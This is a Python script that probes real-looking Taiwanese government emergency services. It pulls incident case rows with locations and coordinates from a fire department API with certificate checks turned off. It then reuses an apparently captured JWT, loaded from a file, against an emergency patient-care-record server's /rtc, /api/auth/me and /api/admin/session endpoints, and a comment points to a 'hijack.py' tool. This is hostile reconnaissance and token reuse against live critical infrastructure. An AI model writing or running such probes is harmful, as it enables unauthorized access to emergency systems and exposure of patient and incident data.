import requests, urllib3, json, time
urllib3.disable_warnings()

# Test the public caseList API
data = {"t": str(time.time())}
resp = requests.post(
    "https://service119.tfd.gov.tw/service119/citizenCase/caseList",
    data=data,
    headers={
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://service119.tfd.gov.tw/service119/accCase",
    },
    verify=False, timeout=10,
)
j = resp.json()
print(f"Cases: {len(j.get('rows', []))}")
for r in j.get("rows", [])[:5]:
    print(f"  {r.get('inTime','')} | {r.get('csPlace', r.get('csPlaceFuzzy', ''))} | "
          f"csX={r.get('csX', 'N/A')} csY={r.get('csY', 'N/A')} | dpKdid={r.get('dpKdid', 'N/A')}")

# Now try EPCR 4000 /rtc endpoint with the femet JWT
print("\n=== EPCR 4000 /rtc with Bearer JWT ===")
token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()
r = requests.get(
    "https://epcr.tpf.gov.tw:4000/rtc",
    headers={"Authorization": f"Bearer {token}", "Origin": "https://epcr.tpf.gov.tw:4000"},
    verify=False, timeout=15,
)
print(f"Status: {r.status_code}, Body: {r.text[:200]}")

# Try /api/admin endpoints mentioned in hijack.py
print("\n=== EPCR 4000 /api/auth/me ===")
r = requests.get(
    "https://epcr.tpf.gov.tw:4000/api/auth/me",
    headers={"Authorization": f"Bearer {token}"},
    verify=False, timeout=15,
)
print(f"Status: {r.status_code}, Body: {r.text[:200]}")

print("\n=== EPCR 4000 /api/admin/session ===")
r = requests.get(
    "https://epcr.tpf.gov.tw:4000/api/admin/session",
    headers={"Authorization": f"Bearer {token}"},
    verify=False, timeout=15,
)
print(f"Status: {r.status_code}, Body: {r.text[:200]}")
